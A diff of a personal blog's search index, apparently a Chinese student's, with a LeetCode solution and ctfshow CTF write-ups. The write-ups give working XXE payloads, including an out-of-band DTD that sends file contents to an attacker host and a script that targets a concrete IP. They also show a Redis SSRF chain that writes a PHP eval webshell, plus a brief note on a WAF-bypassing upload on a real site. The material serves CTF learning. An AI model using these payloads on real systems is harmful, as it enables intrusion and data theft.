+<li>expression 由数字和算符 '+'、'-' 和 '*' 组成。</li>
+</ul>
+<h2 id="二我的思路">二、我的思路</h2>
+<p>最开始，我的处理思路是对于一个expression，我们可以分解一个数字和一个剩余的表达式。将（2*3-4*5）分解为<br />
+<span class="math display">\[
+2*(3-4*5)\\
+2*3-(4*5)
+\]</span><br />
+但显然这样是不对的，我们需要注意的是，这样子我们就没有回头路了，简单的理解就是我们无法处理：<br />
+<span class="math display">\[
+((2*3)-4)*5
+\]</span><br />
+但是一旦意识到我们存在这样的错误时，我们发现其实将我们前面的思路改进一下，当我们计算出<span class="math display">\[2*3\]</span>时，我们就把式子转化为<span class="math inline">\((6-4)*5\)</span>，这又是我们之前处理的范围了。</p>
+<p>于是，我们将我们之前的思路扭转一下，对于任意的表达式<span class="math inline">\(c\)</span>，我们可以将其拆分为<span class="math inline">\(a\)</span> op <span class="math inline">\(b\)</span>，这样我们就得到了分治处理的思路。</p>
+<p><strong>终止条件为：当表达式不存在操作符时，即表达式为数值时，我们直接返回数值本身</strong></p>
+<p>我的代码如下：</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//计算表达式</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">cal</span><span class="params">(<span class="keyword">int</span> num1, <span class="keyword">int</span> num2 , <span class="keyword">char</span> op)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in"><span class="keyword">switch</span></span>(op)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>: <span class="keyword">return</span> num1 + num2;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>: <span class="keyword">return</span> num1 - num2;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>: <span class="keyword">return</span> num1 * num2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">diffWaysToCompute</span><span class="params">(string expression)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = expression.<span class="built_in">length</span>();</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; v3;</span><br><span class="line">        <span class="keyword">int</span> op_flag = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> op = expression[i];</span><br><span class="line">            <span class="keyword">if</span>(!(op == <span class="string">&#x27;+&#x27;</span> || op == <span class="string">&#x27;-&#x27;</span> || op ==<span class="string">&#x27;*&#x27;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            op_flag = <span class="number">1</span>;</span><br><span class="line">            <span class="comment">//计算前半段的表达式结果</span></span><br><span class="line">            vector&lt;<span class="keyword">int</span>&gt; v1 = <span class="built_in">diffWaysToCompute</span>(<span class="built_in">string</span>(expression.<span class="built_in">begin</span>(),expression.<span class="built_in">begin</span>() + i));</span><br><span class="line">            <span class="comment">//计算后半段的表达式结果</span></span><br><span class="line">            vector&lt;<span class="keyword">int</span>&gt; v2 = <span class="built_in">diffWaysToCompute</span>(<span class="built_in">string</span>(expression.<span class="built_in">begin</span>() + i + <span class="number">1</span>,expression.<span class="built_in">end</span>()));</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//二重循环，类似笛卡尔积</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;v1.<span class="built_in">size</span>();i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;v2.<span class="built_in">size</span>();j++)</span><br><span class="line">                &#123;</span><br><span class="line">                    v3.<span class="built_in">push_back</span>(<span class="built_in">cal</span>(v1[i],v2[j],op));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 不存在运算符，即到达终止条件</span></span><br><span class="line">        <span class="keyword">if</span>(op_flag == <span class="number">0</span>)</span><br><span class="line">            v3.<span class="built_in">push_back</span>(<span class="built_in">stoi</span>(expression));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> v3;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>leetcode</category>
+        <category>分治</category>
+      </categories>
+      <tags>
+        <tag>algorithm</tag>
+        <tag>leetcode</tag>
+        <tag>算法</tag>
+        <tag>题解</tag>
       </tags>
   </entry>
   <entry>
@@ -644,9 +644,9 @@
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
-        <tag>ctfshow</tag>
-        <tag>wp</tag>
         <tag>LFI</tag>
+        <tag>wp</tag>
+        <tag>ctfshow</tag>
       </tags>
   </entry>
   <entry>
@@ -738,8 +738,8 @@
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
-        <tag>ctfshow</tag>
         <tag>wp</tag>
+        <tag>ctfshow</tag>
         <tag>upload</tag>
       </tags>
   </entry>
@@ -810,8 +810,8 @@
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
-        <tag>ctfshow</tag>
         <tag>wp</tag>
+        <tag>ctfshow</tag>
         <tag>SQL注入</tag>
       </tags>
   </entry>
@@ -867,6 +867,12 @@
       </tags>
   </entry>
   <entry>
+    <title>NSSCTF-单表替换密码-wp</title>
+    <url>/2022/04/28/blog0018-NSSCTF-%E5%8D%95%E8%A1%A8%E6%9B%BF%E6%8D%A2%E5%AF%86%E7%A0%81-wp/</url>
+    <content><![CDATA[
+]]></content>
+  </entry>
+  <entry>
     <title>ctfshow-SSTI-wp</title>
     <url>/2022/05/06/blog0019-ctfshow-SSTI-wp/</url>
     <content><![CDATA[<h2 id="一写在前面">一、写在前面</h2>
@@ -882,22 +888,39 @@
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
-        <tag>ctfshow</tag>
         <tag>wp</tag>
+        <tag>ctfshow</tag>
         <tag>SSTI</tag>
       </tags>
   </entry>
   <entry>
-    <title>NSSCTF-单表替换密码-wp</title>
-    <url>/2022/04/28/blog0018-NSSCTF-%E5%8D%95%E8%A1%A8%E6%9B%BF%E6%8D%A2%E5%AF%86%E7%A0%81-wp/</url>
-    <content><![CDATA[
+    <title>edusrc首次尝试——任意文件上传</title>
+    <url>/2022/07/11/blog0021-edusrc%E9%A6%96%E6%AC%A1%E5%B0%9D%E8%AF%95%E2%80%94%E2%80%94%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[<h2 id="文件上传">1、文件上传</h2>
+<span id="more"></span>
+<p>进入意见反馈/维修报修页面，发现可以存在图片上传控件。</p>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0021/blog0021_0001.jpg" alt="img3" /></p>
+<p>使用bp抓包修改文件名，绕过WAF</p>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0021/blog0021_0002.jpg" alt="img2" /></p>
+<p>访问对应路径，实现文件解析。</p>
+<p>由于是意见反馈和报修页面，因此可以实现XSS等。</p>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0021/blog0021_0003.png" alt="img1" /></p>
 ]]></content>
+      <categories>
+        <category>src</category>
+        <category>edu</category>
+      </categories>
+      <tags>
+        <tag>upload</tag>
+        <tag>src</tag>
+      </tags>
   </entry>
   <entry>
     <title>ctfshow-权限维持-wp</title>
     <url>/2022/07/06/blog0020-ctfshow-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-wp/</url>
     <content><![CDATA[<h2 id="写在前面">0、写在前面</h2>
-<p>开始学习权限维持啦 <span id="more"></span></p>
+<p>开始学习权限维持啦<br />
+<span id="more"></span></p>
 <h2 id="不死马的利用">1、不死马的利用</h2>
 <p>先看源代码。</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 题目说明：</span></span><br><span class="line"><span class="comment">// 想办法维持权限，确定无误后提交check，通过check后，才会生成flag，此前flag不存在</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;cmd&#x27;</span>:</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;check&#x27;</span>:</span><br><span class="line">        file_get_contents(<span class="string">&quot;http://checker/api/check&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;params not validate&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -922,37 +945,71 @@
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
-        <tag>ctfshow</tag>
         <tag>wp</tag>
+        <tag>ctfshow</tag>
         <tag>权限维持</tag>
       </tags>
   </entry>
   <entry>
-    <title>edusrc首次尝试——任意文件上传</title>
-    <url>/2022/07/11/blog0021-edusrc%E9%A6%96%E6%AC%A1%E5%B0%9D%E8%AF%95%E2%80%94%E2%80%94%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
-    <content><![CDATA[<h2 id="文件上传">1、文件上传</h2>
+    <title>ctfshow-xxe-wp</title>
+    <url>/2022/08/13/blog0023-ctfshow-xxe-wp/</url>
+    <content><![CDATA[<h2 id="一写在前面">一、写在前面</h2>
+<p>XXE漏洞开始了</p>
+<p>推荐阅读博客：</p>
+<p>https://xz.aliyun.com/t/3357#toc-6</p>
 <span id="more"></span>
-<p>进入意见反馈/维修报修页面，发现可以存在图片上传控件。</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0021/blog0021_0001.jpg" alt="img3" /><figcaption aria-hidden="true">img3</figcaption>
-</figure>
-<p>使用bp抓包修改文件名，绕过WAF</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0021/blog0021_0002.jpg" alt="img2" /><figcaption aria-hidden="true">img2</figcaption>
-</figure>
-<p>访问对应路径，实现文件解析。</p>
-<p>由于是意见反馈和报修页面，因此可以实现XSS等。</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0021/blog0021_0003.png" alt="img1" /><figcaption aria-hidden="true">img1</figcaption>
-</figure>
+<h2 id="web373回显读文件">web373（回显读文件）</h2>
+<p>首先来看PHP源代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = simplexml_import_dom(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  </span><br></pre></td></tr></table></figure>
+<p>我们只需要构造含有ctfshow这个元素的xml文档，利用外部实体从而读取文件</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">creds</span> [ </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">creds</span> (<span class="meta-keyword">ctfshow</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">ctfshow</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span><span class="symbol">&amp;goodies;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这样，就能成功把flag打出来。</p>
+<h2 id="web374oob">web374（OOB）</h2>
+<p>这道题就是经典的OOB外带，</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure>
+<p>首先在VPS上搭建xxe.dtd</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://your-ip:port?p=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>注入的xml</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://your-ip/xxe.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+<p>vps上启动http服务</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Python3 -m http.server 2333</span><br></pre></td></tr></table></figure>
+<p>需要注意的是<code>&amp;#37;</code>是HTML实体编码，对应的是<code>%</code></p>
+<p>整个的调用顺序为</p>
+<p><code>%remote</code> （包含远程服务器的dtd） --&gt; <code>%int</code> （包含send实体参数）--&gt; <code>%send</code>（包含file实体参数，访问远程服务器）</p>
+<h2 id="web375oob">web375（OOB）</h2>
+<p>过滤了"xml"的版本声明，但这并不影响。</p>
+<p>同web374</p>
+<h2 id="web376oob">web376（OOB）</h2>
+<p>同web374</p>
+<h2 id="web377utf-16">web377（UTF-16）</h2>
+<p>先看看PHP源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure>
+<p>这里非常重要的一点就是<code>http</code>协议被正则ban了，我们可以考虑利用编码绕过</p>
+<pre><code>    一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。在这种编码的帮助下，使用正则表达式可以很容易地绕过WAF，因为在这种类型的WAF中，正则表达式通常仅配置为单字符集。
+    外来编码也可用于绕过成熟的WAF，因为它们并不总是能够处理上面列出的所有编码。例如，libxml2解析器只支持一种类型的utf-32 - utf-32BE，特别是不支持BOM。</code></pre>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220813225613713.png" alt="image-20220813225613713" style="zoom: 50%;" /></p>
+<p>这时我们需要用上Python脚本了：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> weakref <span class="keyword">import</span> proxy</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f1a29458-0578-476a-825b-2ecc7fa52815.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/xxe.php&quot;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;&#x27;&lt;!DOCTYPE convert [ </span></span><br><span class="line"><span class="string">&lt;!ENTITY % remote SYSTEM &quot;http://121.5.227.123/xxe.dtd&quot;&gt;</span></span><br><span class="line"><span class="string">%remote;%int;%send;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>:<span class="string">&quot;127.0.0.1:8080&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url,data=data.encode(<span class="string">&#x27;utf-16&#x27;</span>),proxies=proxies)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="comment"># print(data.encode(&#x27;utf-16&#x27;))</span></span><br></pre></td></tr></table></figure>
+<h2 id="web378flask-xxe">web378（flask XXE）</h2>
+<p>抓包发现，上传的用户名会回显，因此考虑XXE注入</p>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220814001604129.png" alt="image-20220814001604129" /></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">user</span> [ </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>传入后成功拿到flag.</p>
+<p>后端源代码如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">autor: c0ny1</span></span><br><span class="line"><span class="string">date: 2018-2-7</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;DEBUG&#x27;</span>] = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">USERNAME = <span class="string">&#x27;admin&#x27;</span> <span class="comment"># 账号</span></span><br><span class="line">PASSWORD = <span class="string">&#x27;admin&#x27;</span> <span class="comment"># 密码</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/doLogin&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">doLogin</span>():</span></span><br><span class="line">    result = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 漏洞修复--禁用外部实体  resolve_entities=False</span></span><br><span class="line">        <span class="comment">#tree = etree.fromstring(request.data,etree.XMLParser(resolve_entities=False))</span></span><br><span class="line">        tree = etree.fromstring(request.data) <span class="comment"># 有漏洞</span></span><br><span class="line">        <span class="comment"># 遍历xml结构内容</span></span><br><span class="line">        <span class="keyword">for</span> childa <span class="keyword">in</span> tree:</span><br><span class="line">            <span class="built_in">print</span>(childa.tag, childa.text, childa.attrib)</span><br><span class="line">            <span class="keyword">if</span> childa.tag == <span class="string">&quot;username&quot;</span>:</span><br><span class="line">                username = childa.text</span><br><span class="line">                <span class="built_in">print</span>(username)</span><br><span class="line">            <span class="keyword">if</span> childa.tag == <span class="string">&quot;password&quot;</span>:</span><br><span class="line">                password = childa.text</span><br><span class="line">                <span class="built_in">print</span>(password)</span><br><span class="line">        <span class="keyword">if</span> username == USERNAME <span class="keyword">and</span> password == PASSWORD:</span><br><span class="line">            result = <span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span> % (<span class="number">1</span>,username)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result = <span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span> % (<span class="number">0</span>,username)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> Ex:</span><br><span class="line">        result = <span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span> % (<span class="number">3</span>,<span class="built_in">str</span>(Ex))</span><br><span class="line">    <span class="keyword">return</span> result,&#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/xml;charset=UTF-8&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prn_obj</span>(<span class="params">obj</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join([<span class="string">&#x27;%s:%s&#x27;</span> % item <span class="keyword">for</span> item <span class="keyword">in</span> obj.__dict__.items()]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>src</category>
-        <category>edu</category>
+        <category>ctf</category>
+        <category>web</category>
+        <category>wp</category>
+        <category>XXE</category>
       </categories>
       <tags>
-        <tag>upload</tag>
-        <tag>src</tag>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>wp</tag>
+        <tag>ctfshow</tag>
+        <tag>XXE</tag>
       </tags>
   </entry>
   <entry>
@@ -999,30 +1056,20 @@
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;url=http://ctf.:123@127.0.0.1/flag.php?arg=.show&quot;</span></span><br></pre></td></tr></table></figure>
 <h2 id="web359gopher打mysql">web359（gopher打mysql）</h2>
 <p>主要是利用工具来打了，给了提示说打无密码的mysql</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220812232408774.png" alt="image-20220812232408774" /><figcaption aria-hidden="true">image-20220812232408774</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220812232408774.png" alt="image-20220812232408774" /></p>
 <p>然后直接上传，注意需要二次url编码</p>
 <p>因为此时GET会进行一次解码，然后curl中还会进行一次解码</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220812232510290.png" alt="image-20220812232510290" /><figcaption aria-hidden="true">image-20220812232510290</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220812232510290.png" alt="image-20220812232510290" /></p>
 <h2 id="web360gopher打redis">web360（gopher打redis）</h2>
 <p>这也可以利用工具来打</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220812233607982.png" alt="image-20220812233607982" /><figcaption aria-hidden="true">image-20220812233607982</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220812233607982.png" alt="image-20220812233607982" /></p>
 <p>接下来就和上一题一样直接rce梭了。</p>
 <p>不过作为练习，我们可以手动打一下尝试redis漏洞，利用dict协议探测6379端口发现存在未授权的redis服务。</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220812235327973.png" alt="image-20220812235327973" /><figcaption aria-hidden="true">image-20220812235327973</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220812235327973.png" alt="image-20220812235327973" /></p>
 <p>依次设置</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=dict://127.0.0.1/config:set:dir:/var/www/html</span><br><span class="line">?url=dict://127.0.0.1/set:shell:&quot;\u003c\u003f\u0070\u0068\u0070\u0020\u0065\u0076\u0061\u006c\u0028\u0024\u005f\u0050\u004f\u0053\u0054\u005b\u0031\u005d\u0029\u003b\u0020\u003f\u003e&quot;</span><br><span class="line">?url=dict://127.0.0.1/config:set:dbfilename:ssrf.php</span><br><span class="line">?url=dict://127.0.0.1/save</span><br></pre></td></tr></table></figure>
 <p>这直接将马写入了数据库再保存到php文件中解析</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220813000530136.png" alt="image-20220813000530136" /><figcaption aria-hidden="true">image-20220813000530136</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220813000530136.png" alt="image-20220813000530136" /></p>
 <p>顺利打出rce。</p>
 ]]></content>
       <categories>
@@ -1034,73 +1081,9 @@
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
-        <tag>ctfshow</tag>
         <tag>wp</tag>
+        <tag>ctfshow</tag>
         <tag>ssrf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ctfshow-xxe-wp</title>
-    <url>/2022/08/13/blog0023-ctfshow-xxe-wp/</url>
-    <content><![CDATA[<h2 id="一写在前面">一、写在前面</h2>
-<p>XXE漏洞开始了</p>
-<p>推荐阅读博客：</p>
-<p>https://xz.aliyun.com/t/3357#toc-6</p>
